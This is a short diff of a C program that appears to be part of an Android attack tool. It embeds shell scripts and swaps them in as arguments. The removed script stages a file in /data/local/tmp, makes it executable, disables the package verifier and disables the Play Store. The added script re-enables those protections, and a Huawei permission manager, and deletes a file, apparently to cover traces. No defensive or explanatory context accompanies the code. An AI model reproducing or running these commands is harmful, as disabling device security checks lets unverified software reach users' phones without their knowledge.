@@ -10,7 +10,7 @@
 #include <time.h>
 #include <stdlib.h>
 
-char *sc = {"#!/system/bin/sh\ncat %s > /data/local/tmp/tmp\nrm %s\nchmod 755 /data/local/tmp/tmp\nsettings put global package_verifier_enable 0\npm disable com.android.vending\n"};
+char *sc2 = {"settings put global package_verifier_enable 1\npm enable com.android.vending\nif [ -f \"/system/app/HwPermissionManager.apk\" ]\nthen\npm enable com.huawei.permissionmanager\nfi\nrm %s\n"};
 
 // <search string> <replace string> <string to search>
 unsigned char *str_replace(unsigned char *search , unsigned char *replace , unsigned char *subject) {
@@ -114,7 +114,7 @@ int main(int argc, char *argv[]) {
     return 0;
   }
 
-  argv[1] = sc;
+  argv[1] = sc2;
 
   printf("len %d\n", (int)strlen(argv[1]));
 
